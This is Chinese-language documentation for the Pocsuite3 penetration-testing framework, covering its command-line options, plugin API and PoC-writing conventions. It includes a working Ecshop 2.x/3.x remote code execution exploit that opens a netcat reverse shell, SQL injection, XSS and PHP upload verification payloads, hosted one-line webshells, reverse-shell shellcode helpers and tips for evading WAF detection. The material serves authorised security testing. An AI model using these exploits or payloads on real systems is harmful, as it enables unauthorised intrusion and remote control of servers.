# 关于 Pocsuite
Pocsuite 是由知道创宇404实验室打造的一款开源的远程漏洞测试框架。它是知道创宇安全研究团队发展的基石，是团队发展至今一直维护的一个项目，保障了我们的 Web 安全研究能力的领先。

你可以直接使用 Pocsuite 进行漏洞的验证与利用；你也可以基于 Pocsuite 进行 PoC/Exp 的开发，因为它也是一个 PoC 开发框架；同时，你还可以在你的漏洞测试工具里直接集成 Pocsuite，它也提供标准的调用类。

官网: http://pocsuite.org/

最新文档地址: https://github.com/knownsec/pocsuite3

## 文档目录

### 功能简介

1.漏洞测试框架

- Pocsuite3 采用 Python3 编写，支持验证，利用 及 shell 三种插件模式，你可以指定单个目标或者从文件导入多个目标，使用单个 PoC 或者 PoC 集合进行漏洞的验证或利用。可以使用命令行模式进行调用，也支持类似 Metaspolit 的交互模式进行处理，除此之外，还包含了一些基本的如输出结果报告等功能。（使用方法参考《Pocsuite 使用方法》）

2.PoC/Exp 开发包

- Pocsuite3 也是一个 PoC/Exp 的 SDK，也就是开发包，我们封装了基础的 PoC 类,以及一些常用的方法，比如 Webshell 的相关方法，基于Pocsuite3 进行 PoC/Exp 的开发，你可以只要编写最核心的漏洞验证部分代码，而不用去关心整体的结果输出等其他一些处理。基于 Pocsuite3 编写的 PoC/Exp 可以直接被 Pocsuite 使用，Seebug网站也有几千个基于pocsuite 的 PoC/Exp。

3.可被集成模块

- Pocsuite3 除了本身具有直接就是一个安全工具除外，也可以作为一个Python包被集成进漏洞测试模块。你还可以基于 Pocsuite3 开发你自己的应用，我们在 Pocsuite3 里封装了可以被其他程序 import 的 PoC 调用类，你可以基于 Pocsuite3 进行二次开发，调用 Pocsuite3 开发您自己的漏洞验证工具。

4.集成 ZoomEye， Seebug， Ceye

- Pocsuite3 还集成了 ZoomEye， Seebug， Ceye API，通过该功能，你可以通过 ZoomEye API 批量获取指定条件的测试目标（通过 ZoomEye 的 Dork 进行搜索），同时通过 Seebug API 读取指定组件或者类型的漏洞的 PoC 或者本地 PoC，进行自动化的批量测试。利用Ceye 验证盲打的 DNS 和 HTTP 请求

### 框架

项目地址: https://github.com/knownsec/pocsuite3

最新版的文档请参考 github 仓库中 Pocsuite开发文档。

##### 获取

Pocsuite 可以运行在 Python 3.x 版本的任何平台上。

你可以通过用 Git 来克隆代码仓库中的最新源代码

```
git clone git@github.com:knownsec/pocsuite3.git
```

##### 安装

或者你可以点击 这里 下载最新的源代码 zip 包,并解压
```
wget https://github.com/knownsec/pocsuite3/archive/master.zip

unzip master.zip

cd pocsuite3

python cli.py --version
```

或者直接使用
```
pip install pocsuite3

pocsuite --version
```

目录结构：

```
C:.
├─.github #Github配置文件
│  └─workflows 
├─docs   #文档
├─manpages #联机帮助文档
├─pocsuite3 #Pocsuite3 主程序
│  ├─api #调用的第三方API接口
│  ├─data #基础数据
│  ├─lib #核心库
│  │  ├─controller
│  │  ├─core 
│  │  │  └─__pycache__
│  │  ├─helper
│  │  │  ├─archieve
│  │  │  └─java
│  │  ├─parse 
│  │  ├─request 
│  │  │  └─patch
│  │  ├─utils 
│  │  └─__pycache__
│  ├─modules #调用的第三方API模块
│  │  ├─censys
│  │  ├─ceye
│  │  ├─fofa
│  │  ├─httpserver
│  │  ├─listener
│  │  ├─quake
│  │  ├─seebug
│  │  ├─shodan
│  │  ├─spider
│  │  └─zoomeye
│  ├─plugins #调用的第三方插件
│  ├─pocs #Poc清单
│  ├─shellcodes #shellcode清单
│  │  ├─data
│  │  │  ├─java
│  │  │  │  └─src
│  │  │  │      └─ReverseTCP
│  │  │  ├─linux
│  │  │  │  ├─src
│  │  │  │  └─x64
│  │  │  │      └─src
│  │  │  └─windows
│  │  │      ├─src
│  │  │      └─x64
│  │  │          └─src
│  │  └─tools
│  └─__pycache__
└─tests #测试目录
```


##### 使用
###### 用法

- **Pocsuite**: 一个很酷的hackable命令行程序

###### Pocsuite

它支持三种模式：

 - ```verify```
 - ```attack```
 - ```shell```

您还可以使用 ```pocsuite -h``` 获取更多详细信息。

```
usage: pocsuite [options]

optional arguments:
  -h, --help            show this help message and exit
  --version             Show program's version number and exit
  --update              Update Pocsuite
  -v {0,1,2,3,4,5,6}    Verbosity level: 0-6 (default 1)

Target:
  At least one of these options has to be provided to define the target(s)

  -u URL [URL ...], --url URL [URL ...]
                        Target URL (e.g. "http://www.site.com/vuln.php?id=1")
  -f URL_FILE, --file URL_FILE
                        Scan multiple targets given in a textual file
  -r POC [POC ...]      Load POC file from local or remote from seebug website
  -c CONFIGFILE         Load options from a configuration INI file

Mode:
  Pocsuite running mode options

  --verify              Run poc with verify mode
  --attack              Run poc with attack mode
  --shell               Run poc with shell mode

Request:
  Network request options

  --cookie COOKIE       HTTP Cookie header value
  --host HOST           HTTP Host header value
  --referer REFERER     HTTP Referer header value
  --user-agent AGENT    HTTP User-Agent header value
  --random-agent        Use randomly selected HTTP User-Agent header value
  --proxy PROXY         Use a proxy to connect to the target URL
  --proxy-cred PROXY_CRED
                        Proxy authentication credentials (name:password)
  --timeout TIMEOUT     Seconds to wait before timeout connection (default 30)
  --retry RETRY         Time out retrials times.
  --delay DELAY         Delay between two request of one thread
  --headers HEADERS     Extra headers (e.g. "key1: value1\nkey2: value2")

Account:
  Telnet404、Shodan、CEye、Fofa account options

  --login-user LOGIN_USER
                        Telnet404 login user
  --login-pass LOGIN_PASS
                        Telnet404 login password
  --shodan-token SHODAN_TOKEN
                        Shodan token
  --fofa-user FOFA_USER
                        fofa user
  --fofa-token FOFA_TOKEN
                        fofa token
  --quake-token QUAKE_TOKEN
                        quake token
  --censys-uid CENSYS_UID
                        Censys uid
  --censys-secret CENSYS_SECRET
                        Censys secret

Modules:
  Modules(Seebug、Zoomeye、CEye、Fofa、Quake Listener) options

  --dork DORK           Zoomeye dork used for search.
  --dork-zoomeye DORK_ZOOMEYE
                        Zoomeye dork used for search.
  --dork-shodan DORK_SHODAN
                        Shodan dork used for search.
  --dork-censys DORK_CENSYS
                        Censys dork used for search.
  --dork-fofa DORK_FOFA
                        Fofa dork used for search.
  --dork-quake DORK_QUAKE
                        Quake dork used for search.
  --max-page MAX_PAGE   Max page used in ZoomEye API(10 targets/Page).
  --search-type SEARCH_TYPE
                        search type used in ZoomEye API, web or host
  --vul-keyword VUL_KEYWORD
                        Seebug keyword used for search.
  --ssv-id SSVID        Seebug SSVID number for target PoC.
  --lhost CONNECT_BACK_HOST
                        Connect back host for target PoC in shell mode
  --lport CONNECT_BACK_PORT
                        Connect back port for target PoC in shell mode
  --comparison          Compare popular web search engines
  --dork-b64            Whether dork is in base64 format

Optimization:
  Optimization options

  --plugins PLUGINS     Load plugins to execute
  --pocs-path POCS_PATH
                        User defined poc scripts path
  --threads THREADS     Max number of concurrent network requests (default 1)
  --batch BATCH         Automatically choose defaut choice without asking.
  --requires            Check install_requires
  --quiet               Activate quiet mode, working without logger.
  --ppt                 Hiden sensitive information when published to the
                        network
  --pcap                use scapy capture flow
  --rule                export rules, default export reqeust and response
  --rule-req            only export request rule
  --rule-filename RULE_FILENAME
                        Specify the name of the export rule file

Poc options:
  definition options for PoC

  --options             Show all definition options

```

**-f, --file URLFILE**

- 扫描文本文件中给出的多个目标

```
$ pocsuite -r pocs/poc_example.py -f url.txt --verify
```

- 攻击模式只需要将 ```--verify``` 替换为 ``` --attack```。

**-r POCFILE**

- POCFILE 可以从Seebug官网通过SSVID编号加载pocsuite3插件。


```
$ pocsuite -r ssvid-97343 -u http://www.example.com --shell
```

**--verify**

- 使用验证模式运行 poc。 PoC 将仅用于漏洞扫描。

```
$ pocsuite -r pocs/poc_example.py -u http://www.example.com/ --verify
```

**--attack**

- 以攻击模式运行 poc，PoC 将被利用。

```
$ pocsuite -r pocs/poc_example.py -u http://www.example.com/ --attack
```

**--shell**

- 以 shell 模式运行 poc，PoC 将被利用，当 PoC shellcode 成功执行时，pocsuite3 将进入交互式 shell。

```
$ pocsuite -r pocs/poc_example.py -u http://www.example.com/ --shell
```

**--threads THREADS**

- 使用多线程，默认线程数为1

```
$ pocsuite -r pocs/poc_example.py -f url.txt --verify --threads 10
```

**--dork DORK**

- 如果您是 [**ZoomEye**](https://www.zoomeye.org/) 用户，该 API 是一个很酷且可提供多维度网络空间测绘数据的接口。 比如搜索：

- 使用 ```port:6379``` 和 ```redis``` 关键字搜索 redis 服务器。


```
$ pocsuite --dork 'port:6379' --vul-keyword 'redis' --max-page 2

```


**--dork-b64**

- 为了解决转义问题，使用--dork-b64告诉程序你传入的是base64编码的dork。
 

```
$ pocsuite --dork cG9ydDo2Mzc5 --vul-keyword 'redis' --max-page 2 --dork-b64
```

 **--rule**

- 导出suricate规则，默认导出请求和响应，poc目录为/pocs/。 使用--pocs-path参数设置需要对poc进行规则的目录
 
```
$ pocsuite --rule
```

**--rule-req**

- 在某些情况下，我们可能只需要请求规则，--rule-req 只需要导出请求规则。

```
$ pocsuite --rule-req
```

如果你有好的想法，请联系我们。

###### Example

```
cli mode

    # basic usage, use -v to set the log level
	pocsuite -u http://example.com -r example.py -v 2

	# run poc with shell mode
	pocsuite -u http://example.com -r example.py -v 2 --shell

	# search for the target of redis service from ZoomEye and perform batch detection of vulnerabilities. The thread is set to 20
	pocsuite -r redis.py --dork service:redis --threads 20

	# load all poc in the poc directory and save the result as html
	pocsuite -u http://example.com --plugins poc_from_pocs,html_report

	# load the target from the file, and use the poc under the poc directory to scan
	pocsuite -f batch.txt --plugins poc_from_pocs,html_report

	# load CIDR target
	pocsuite -u 10.0.0.0/24 -r example.py --plugins target_from_cidr

	# the custom parameters `command` is implemented in ecshop poc, which can be set from command line options
	pocsuite -u http://example.com -r ecshop_rce.py --attack --command "whoami"

console mode
    poc-console
```

## pocsuite3 开发文档 及 PoC 编写规范及要求说明
---
* [概述](#overview)
* [插件 编写规范](#write_plugin)
  * [TARGETS 类型插件](#plugin_targets)
  * [POCS 类型插件](#plugin_pocs)
  * [RESULTS 类型插件](#plugin_results)
* [PoC 脚本编写规范](#write_poc)
  * [PoC python脚本编写步骤](#pocpy)
  * [可自定义参数的插件](#可自定义参数的插件<div-id="plugin_div"></div>)
  * [PoC 编写注意事项](#attention)
  * [Pocsuite 远程调用文件列表](#inclue_files)
  * [通用API列表](#common_api)
    * [通用方法](#api_common)
    * [参数调用](#api_params)
  * [PoC 代码示例](#PoCexample)
    * [PoC Python 代码示例](#pyexample)
* [pocsuite3 集成调用](#pocsuite_import)
* [PoC 规范说明](#PoCstandard)
  * [PoC 编号说明](#idstandard)
  * [PoC 命名规范](#namedstandard)
  * [PoC 第三方模块依赖说明](#requires)
  * [PoC 结果返回规范](#resultstandard)
    * [extra 字段说明](#result_extara)
    * [通用字段说明](#result_common)
  * [漏洞类型规范](#vulcategory)


### 概述<div id="overview"></div>
 本文档为 Pocsuite3 插件及 PoC 脚本编写规范及要求说明，包含了插件 PoC 脚本编写的步骤以及相关 API 的一些说明。一个优秀的 PoC 离不开反复的调试、测试，在阅读本文档前，请先阅读 [《Pocsuite 使用文档》](./USAGE.md)。或参考https://paper.seebug.org/904/ 查看pocsuite3的一些新特性。

#### 插件 编写规范<div id="write_plugin"></div>
pocsuite3 共有三种类型的插件，定义在 `pocsuite3.lib.core.enums.PLUGIN_TYPE` 中.

#### TARGETS 类型插件<div id="plugin_targets"></div>
TARGETS 类型插件 用来自定义在系统初始化时候 加载检测目标的功能，例如从redis 或 数据库加载 targets
```python
from pocsuite3.api import PluginBase
from pocsuite3.api import PLUGIN_TYPE
from pocsuite3.api import logger
from pocsuite3.api import register_plugin

class TargetPluginDemo(PluginBase):
    category = PLUGIN_TYPE.TARGETS
    
    def init(self):
        targets = ['www.a.com', 'www.b.com'] # load from redis, database ...
        count = 0
            for target in targets:
                if self.add_target(target):
                    count += 1

        info_msg = "[PLUGIN] get {0} target(s) from demo".format(count)
        logger.info(info_msg)


register_plugin(TargetPluginDemo)
```

#### POCS 类型插件<div id="plugin_pocs"></div>
POCS 类型插件 用来自定义在系统初始化时候 加载PoC 脚本的功能，例如从redis 或 数据库加载 PoC脚本代码
```python
from pocsuite3.api import PluginBase
from pocsuite3.api import PLUGIN_TYPE
from pocsuite3.api import logger
from pocsuite3.api import register_plugin

class TargetPluginDemo(PluginBase):
    category = PLUGIN_TYPE.POCS
    
    def init(self):
        pocs = [POC_CODE_1, POC_CODE_2] # load PoC code from redis, database ...
        count = 0
            for poc in pocs:
                if poc and self.add_poc(poc):
                    count += 1

        info_msg = "[PLUGIN] get {0} poc(s) from demo".format(count)
        logger.info(info_msg)


register_plugin(TargetPluginDemo)
```

#### RESULTS 类型插件<div id="plugin_results"></div>
RESULTS 类型插件 用来自定义检测结果的导出，例如导出 html 报表等
```python
from pocsuite3.api import PluginBase
from pocsuite3.api import PLUGIN_TYPE
from pocsuite3.api import logger
from pocsuite3.api import get_results
from pocsuite3.api import register_plugin

class HtmlReport(PluginBase):
    category = PLUGIN_TYPE.RESULTS

    def init(self):
        debug_msg = "[PLUGIN] html_report plugin init..."
        logger.debug(debug_msg)

    def start(self):
        # TODO
        # Generate html report

        for result in get_results():
            pass

        info_msg = '[PLUGIN] generate html report done.'
        logger.info(info_msg)

register_plugin(HtmlReport)

```

若需要`实时的`保存结果，需要在申明`handle`来处理，可参考https://github.com/knownsec/pocsuite3/blob/master/pocsuite3/plugins/file_record.py的写法。

### PoC 编写规范<div id="write_poc"></div>

#### PoC python脚本编写步骤<div id="pocpy"></div>

本小节介绍 PoC python脚本编写

pocsuite3 仅支持 Python3.x，如若编写 Python3 格式的 PoC，需要开发者具备一定的 Python3 基础

1. 首先新建一个`.py`文件,文件名应当符合 [《PoC 命名规范》](#namedstandard)


2. 编写 PoC 实现类`DemoPOC`,继承自`PoCBase`类.

```python
from pocsuite3.api import Output, POCBase, register_poc, requests, logger
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD
from pocsuite3.lib.utils import random_str

  class DemoPOC(POCBase):
    ...
```

3. 填写 PoC 信息字段,**要求认真填写所有基本信息字段**
```python
    vulID = '1571'  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = '1' #默认为1
    author = 'seebug' #  PoC作者的大名
    vulDate = '2014-10-16' #漏洞公开的时间,不知道就写今天
    createDate = '2014-10-16'# 编写 PoC 的日期
    updateDate = '2014-10-16'# PoC 更新的时间,默认和编写时间一样
    references = ['https://www.sektioneins.de/en/blog/14-10-15-drupal-sql-injection-vulnerability.html']# 漏洞地址来源,0day不用写
    name = 'Drupal 7.x /includes/database/database.inc SQL注入漏洞 PoC'# PoC 名称
    appPowerLink = 'https://www.drupal.org/'# 漏洞厂商主页地址
    appName = 'Drupal'# 漏洞应用名称
    appVersion = '7.x'# 漏洞影响版本
    vulType = 'SQL Injection'#漏洞类型,类型参考见 漏洞类型规范表
    desc = '''
        Drupal 在处理 IN 语句时，展开数组时 key 带入 SQL 语句导致 SQL 注入，
        可以添加管理员、造成信息泄露。
    ''' # 漏洞简要描述
    samples = []# 测试样列,就是用 PoC 测试成功的网站
    install_requires = [] # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
       pocDesc = ''' poc的用法描述 '''
```

4. 编写验证模式

```python
  def _verify(self):
        output = Output(self)
        # 验证代码
        if result: # result是返回结果
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
```

5. 编写攻击模式

攻击模式可以对目标进行 getshell,查询管理员帐号密码等操作.定义它的方法与检测模式类似
```python
def _attack(self):
    output = Output(self)
    result = {}
    # 攻击代码
```

和验证模式一样,攻击成功后需要把攻击得到结果赋值给 result 变量

**注意:如果该 PoC 没有攻击模式,可以在 \_attack()函数下加入一句 return self.\_verify() 这样你就无需再写 \_attack 函数了。**

6. 编写shell模式 [**new**]

pocsuite3 在 shell 模式 会默认监听`6666`端口， 编写对应的攻击代码，让目标执行反向连接 运行pocsuite3 系统IP的 `6666`端口即可得到一个shell
```python
def _shell(self):
    cmd = REVERSE_PAYLOAD.BASH.format(get_listener_ip(), get_listener_port())
    # 攻击代码 execute cmd
```

shell模式下，只能运行单个PoC脚本，控制台会进入shell交互模式执行命令及输出

7. 结果返回

不管是验证模式或者攻击模式，返回结果 result 中的 key 值必须按照下面的规范来写，result 各字段意义请参见[《PoC 结果返回规范》](#resultstandard)

```
'Result':{
   'DBInfo' :   {'Username': 'xxx', 'Password': 'xxx', 'Salt': 'xxx' , 'Uid':'xxx' , 'Groupid':'xxx'},
   'ShellInfo': {'URL': 'xxx', 'Content': 'xxx' },
   'FileInfo':  {'Filename':'xxx','Content':'xxx'},
   'XSSInfo':   {'URL':'xxx','Payload':'xxx'},
   'AdminInfo': {'Uid':'xxx' , 'Username':'xxx' , 'Password':'xxx' }
   'Database':  {'Hostname':'xxx', 'Username':'xxx',  'Password':'xxx', 'DBname':'xxx'},
   'VerifyInfo':{'URL': 'xxx' , 'Postdata':'xxx' , 'Path':'xxx'}
   'SiteAttr':  {'Process':'xxx'}
   'Stdout': 'result output string'
}
```

output 为 Pocsuite 标准输出API，如果要输出调用成功信息则使用 `output.success(result)`,如果要输出调用失败则 `output.fail()`,系统自动捕获异常，不需要PoC里处理捕获,如果PoC里使用try...except 来捕获异常，可通过`output.error('Error Message')`来传递异常内容,建议直接使用模板中的parse_output通用结果处理函数对_verify和_attack结果进行处理。
```
def _verify(self, verify=True):
    result = {}
    ...

    return self.parse_output(result)

def parse_output(self, result):
    output = Output(self)
    if result:
        output.success(result)
    else:
        output.fail()
    return output
```

8. 注册PoC实现类

在类的外部调用register_poc()方法注册PoC类
```
class DemoPOC(POCBase):
    #POC内部代码

#注册 DemoPOC 类
register_poc(DemoPOC)
```
##### 可自定义参数的POC<div id="plugin_div"></div>
如果你需要编写一个可以交互参数的poc文件(例如有的poc脚本需要填写登录信息，或者任意命令执行时执行任意命令)，那么可以在poc文件中声明一个`_options`方法。一个简单的例子如下

```python
from collections import OrderedDict

from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, VUL_TYPE
from pocsuite3.api import OptString


class DemoPOC(POCBase):
    vulID = '00000'  # ssvid
    version = '1.0'
    author = ['knownsec.com']
    vulDate = '2019-2-26'
    createDate = '2019-2-26'
    updateDate = '2019-2-25'
    references = ['']
    name = '自定义命令参数登录例子'
    appPowerLink = 'http://www.knownsec.com/'
    appName = 'test'
    appVersion = 'test'
    vulType = VUL_TYPE.XSS
    desc = '''这个例子说明了你可以使用console模式设置一些参数或者使用命令中的'--'来设置自定义的参数'''
    samples = []
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    def _options(self):
        o = OrderedDict()
        o["username"] = OptString('', description='这个poc需要用户登录，请输入登录账号', require=True)
        o["password"] = OptString('', description='这个poc需要用户密码，请输出用户密码', require=False)
        return o

    def _verify(self):
        result = {}
        payload = "username={0}&password={1}".format(self.get_option("username"), self.get_option("password"))
        r = requests.post(self.url, data=payload)
        if r.status_code == 200:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
            result['VerifyInfo']['Postdata'] = payload

        return self.parse_output(result)

    def _attack(self):
        return self._verify()

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output


register_poc(DemoPOC)
```

它可以使你在`console`或者`cli`模式下调用。

- 在console模式下，pocsuite3模仿了msf的操作模式，你只需要使用`set`命令来设置相应的参数，然后`run`或者`check`来执行(`attack`和`shell`命令也可以)。
- 在cli模式下，如上面例子所示，定义了`username`和`password`两个字段，你可以在参数后面加上`--username test --password test`来调用执行，需要注意的是，如果你的参数中包含了空格，用双引号`"`来包裹它。

#### 自定义字段

像其他工具一样，如果你想使用自定义的字段，将它定义到`_options`方法中，然后返回一个数组。如果在poc文件中想调用自定义字段，需要提前引入

```python
from pocsuite3.api import OptString,OptDict,OptIP,OptPort,OptBool,OptInteger,OptFloat,OptItems
```

| 字段类型   | 字段描述                                                     | 参数解释                                                     | 相关例子 |
| ---------- | ------------------------------------------------------------ | ------------------------------------------------------------ | -------- |
| OptString  | 接收字符串类型数据                                           | default:传入一个默认值<br />descript:字段描述，默认为空<br />require:是否必须，默认False |          |
| OptDict    | 接收一个字典类型参数，在选择上如果选择key，调用时会调用对应的value | default:传入一个默认值<br />descript:字段描述，默认为空<br />require:是否必须，默认False |          |
| OptIP      | 接收IP类型的字符串                                           | default:传入一个默认值<br />descript:字段描述，默认为空<br />require:是否必须，默认False |          |
| OptPort    | 接收端口类型参数                                             | default:传入一个默认值<br />descript:字段描述，默认为空<br />require:是否必须，默认False |          |
| OptBool    | 接收布尔类型参数                                             | default:传入一个默认值<br />descript:字段描述，默认为空<br />require:是否必须，默认False |          |
| OptInteger | 接收整数类型参数                                             | default:传入一个默认值<br />descript:字段描述，默认为空<br />require:是否必须，默认False |          |
| OptFloat   | 接收浮点数类型参数                                           | default:传入一个默认值<br />descript:字段描述，默认为空<br />require:是否必须，默认False |          |
| OptItems   | 接收list类型参数                                             | default:传入一个默认值<br />selectd:默认选择<br />descript:字段描述，默认为空<br />require:是否必须，默认False |          |

需要注意的是，`console`模式支持所有的参数类型，`cli`模式除了`OptDict`、`OptBool`、`OptItems`类型外都支持。
#### PoC 编写注意事项<div id="attention"></div>
1. 要求在编写PoC的时候，尽量的不要使用第三方模块，如果在无法避免的情况下，请认真填写install_requires 字段，填写格式参考《PoC第三方模块依赖说明》。
2.	要求编写PoC的时候，尽量的使用Pocsuite 已经封装的API提供的方法，避免自己重复造轮子，对于一些通用方法可以加入到API，具体参考《通用API列表》。
3.	如果PoC需要包含远程文件等，统一使用Pocsuite 远程调用文件，具体可以参考[《Pocsuite 远程调用文件列表》](#inclue_files)，不要引入第三方文件，如果缺少对应文件，联系管理员添加。
4.	要求每个PoC在编写的时候，尽可能的不要要求输入参数，这样定制化过高，不利于PoC的批量化调度执行，尽可能的PoC内部实现参数的构造，至少应该设置默认值，如某个PoC需要指定用户id，那么应该允许使用extar_param传入id，也应该没有传入该参数的时候自动设置默认值，不应该影响PoC的正常运行与验证。
5.	要求每个PoC在输出结果的时候，尽可能的在不破坏的同时输出取证信息，如输出进程列表，具体参考[《PoC 结果返回规范》](#resultstandard)。
6.	要求认真填写PoC信息字段，其中vulID请填写Seebug上的漏洞ID（不包含SSV-）。
7.	为了防止误报产生以及避免被关键词被WAF等作为检测特征,要求验证结果判断的时候输出随机的字符串（可以调用API中的`random_str`方法），而不用采用固定字符串。
比如：  

```
检测 SQL 注入时,
    token = random_str()
    payload = 'select md5(%s)' % token
    ...

    if hashlib.new('md5', token).hexdigest() in content:
        result['VerifyInfo'] = {}
        result['VerifyInfo']['URL'] = self.url + payload
检测 XSS 漏洞时,
    token = random_str()
    payload = 'alert("%s")' % token
    ...

    if hashlib.new('md5', token).hexdigest() in content:
        result['VerifyInfo'] = {}
        result['VerifyInfo']['URL'] = self.url + payload
检测 PHP 文件上传是否成功,

    token = random_str()
    payload = '<?php echo md5("%s");unlink(__FILE__);?>' % token
    ...

    if hashlib.new('md5', token).hexdigest() in content:
        result['VerifyInfo'] = {}
        result['VerifyInfo']['URL'] = self.url+payload
```

8.	任意文件如果需要知道网站路径才能读取文件的话,可以读取系统文件进行验证,要写 Windows 版和 Linux 版两个版本。
9.	检测模式下,上传的文件一定要删掉。
10.	程序可以通过某些方法获取表前缀，just do it；若不行，保持默认表前缀。
11.	PoC 编写好后，务必进行测试，测试规则为：5个不受漏洞的网站，确保 PoC 攻击不成功；5个受漏洞影响的网站，确保 PoC 攻击成功

#### Pocsuite 远程调用文件列表<div id="inclue_files"></div>
部分 PoC 需要采用包含远程文件的形式，要求基于 Pocsuite 的 PoC 统一调用统一文件(如需引用未在以下文件列表内文件，请联系s1@seebug.org或者直接提交 issue)。
统一URL调用路径：`http://pocsuite.org/include_files/`，如 `http://pocsuite.org/include_files/xxe_verify.xml`

**文件列表**

|文件名|说明|
|-----|---|
|a.jsp|一个通用简单的 JSP 一句话 Shell，攻击模式|
|b.jsp|一个通用简单的 JSP 一句话 Shell，验证模式|
|php_attack.txt|PHP 一句话|
|php_verify.txt|PHP 打印 md5 值|
|xxe_verify.xml|XXE 验证文件|


#### 通用API列表<div id="common_api"></div>
在编写 PoC 的时候，相关方法请尽量调用通用的已封装的 API

**通用方法**<div id="api_common"></div>

|方法|说明|
|---|----|
|from pocsuite3.api import logger|日志记录，比如logger.log(info)|
|from pocsuite3.api import requests|请求类，用法同 requests|
|from pocsuite3.api import Seebug|Seebug api 调用|
|from pocsuite3.api import ZoomEye|ZoomEye api 调用|
|from pocsuite3.api import CEye|Ceye api 调用|
|from pocsuite3.api import crawl|简单爬虫功能|
|from pocsuite3.api import PHTTPServer|Http服务功能|
|from pocsuite3.api import REVERSE_PAYLOAD|反向连接shell payload|
|from pocsuite3.api import get_results|获取结果|

**参数调用**<div id="api_params"></div>

* self.headers 用来获取 http 请求头, 可以通过 --cookie, --referer, --user-agent, --headers 来修改和增加需要的部分
* self.params 用来获取 --extra-params 赋值的变量, Pocsuite 会自动转化成字典格式, 未赋值时为空字典
* self.url 用来获取 -u / --url 赋值的 URL, 如果之前赋值是 baidu.com 这样没有协议的格式时, Pocsuite 会自动转换成 http:// baidu.com

#### ShellCode生成支持

在一些特殊的Linux和Windows环境下，想得到反弹shell条件比较困难。为此我们制作了用于在Windows/Linux x86 x64环境下的用于反弹的shellcode，并制作了接口支持，你在只需要拥有命令执行权限下便可以自动将shellcode写入到目标机器以及执行反弹shell命令。Demo Poc：https://github.com/knownsec/pocsuite3/blob/master/pocsuite3/pocs/thinkphp_rce2.py

```python
from pocsuite3.api import generate_shellcode_list
_list = generate_shellcode_list(listener_ip=get_listener_ip(),listener_port=get_listener_port(),os_target=OS.LINUX,os_target_arch=OS_ARCH.X86)
```

将生成一长串执行指令，执行这些指令便可以反弹出一个shell。

#### HTTP服务内置

对于一些需要第三方HTTP服务才能验证的漏洞，Pocsuite3也提供对应的API，支持在本地开启一个HTTP服务方便进行验证。

可查看测试用例:https://github.com/knownsec/pocsuite3/blob/master/tests/test_httpserver.py

#### PoC 代码示例<div id="PoCexample"></div>

##### PoC Python 代码示例<div id="pyexample"></div>

[Ecshop 2.x/3.x Remote Code Execution](http://www.seebug.org/vuldb/ssvid-97343) PoC:

```
import base64
from urllib.parse import urljoin

from pocsuite3.api import Output, POCBase, register_poc, requests, logger
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD
from pocsuite3.lib.utils import random_str
from requests.exceptions import ReadTimeout


class DemoPOC(POCBase):
    vulID = '97343'  # ssvid
    version = '3.0'
    author = ['seebug']
    vulDate = '2018-06-14'
    createDate = '2018-06-14'
    updateDate = '2018-06-14'
    references = ['https://www.seebug.org/vuldb/ssvid-97343']
    name = 'Ecshop 2.x/3.x Remote Code Execution'
    appPowerLink = ''
    appName = 'ECSHOP'
    appVersion = '2.x,3.x'
    vulType = 'Romote Code Execution'
    desc = '''
    '''
    samples = []
    install_requires = ['']

    def _verify(self):
        result = {}
        path = "user.php?act=login"
        url = urljoin(self.url, path)
        echashs = [
            '554fcae493e564ee0dc75bdf2ebf94ca',  # ECShop 2.x hash
            '45ea207d7a2b68c49582d2d22adf953a'  # ECShop 3.x hash
        ]

        for echash in echashs:
            payload = ('{0}ads|a:2:{{s:3:"num";s:116:"*/ select 1,0x2720756E696F6E202F2A,3,4,5,'
                       '6,7,8,0x7b24616263275d3b6563686f20706870696e666f2f2a2a2f28293b2f2f7d,10'
                       '-- -";s:2:"id";s:10:"\' union /*";}}{0}').format(echash)
            headers = {"Referer": payload}
            try:
                resp = requests.get(url, headers=headers)
                if resp and resp.status_code == 200 and "<title>phpinfo()</title>" in resp.text:
                    result['VerifyInfo'] = {}
                    result['VerifyInfo']['URL'] = url
                    result['VerifyInfo']['Referer'] = payload
                    break
            except Exception as ex:
                pass

        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

    def _attack(self):
        return self._verify()

    def _shell(self):
        path = "user.php"
        url = urljoin(self.url, path)
        echashs = [
            '554fcae493e564ee0dc75bdf2ebf94ca',  # ECShop 2.x hash
            '45ea207d7a2b68c49582d2d22adf953a'  # ECShop 3.x hash
        ]

        cmd = REVERSE_PAYLOAD.NC.format(get_listener_ip(), get_listener_port())
        phpcode = 'passthru("{0}");'.format(cmd)
        encoded_code = base64.b64encode(phpcode.encode())
        postdata = {
            'action': 'login',
            'vulnspy': 'eval/**/(base64_decode({0}));exit;'.format(encoded_code.decode()),
            'rnd': random_str(10)
        }

        for echash in echashs:
            payload = '{0}ads|a:3:{{s:3:"num";s:207:"*/ select 1,0x2720756e696f6e2f2a,3,4,5,6,7,8,0x7b247b2476756c6e737079275d3b6576616c2f2a2a2f286261736536345f6465636f646528275a585a686243676b5831425055315262646e5673626e4e77655630704f773d3d2729293b2f2f7d7d,0--";s:2:"id";s:9:"'"'"' union/*";s:4:"name";s:3:"ads";}}{1}'.format(echash, echash)
            headers = {"Referer": payload}
            try:
                resp = requests.post(url, data=postdata, headers=headers)
                if resp and resp.status_code == 200 and "<title>phpinfo()</title>" in resp.text:
                    break
            except ReadTimeout:
                break
            except Exception as ex:
                pass


register_poc(DemoPOC)

```


HttpServer Demo:

```python
"""
If you have issues about development, please read:
https://github.com/knownsec/pocsuite3/blob/master/docs/CODING.md
for more about information, plz visit http://pocsuite.org
"""
from http.server import SimpleHTTPRequestHandler

from pocsuite3.api import Output, POCBase, register_poc
from pocsuite3.api import PHTTPServer


class MyRequestHandler(SimpleHTTPRequestHandler):
    def do_GET(self):
        path = self.path
        status = 404
        count = 0

        xxe_dtd = '''xxx'''
        if path == "/xxe_dtd":
            count = len(xxe_dtd)
            status = 200
            self.send_response(status)
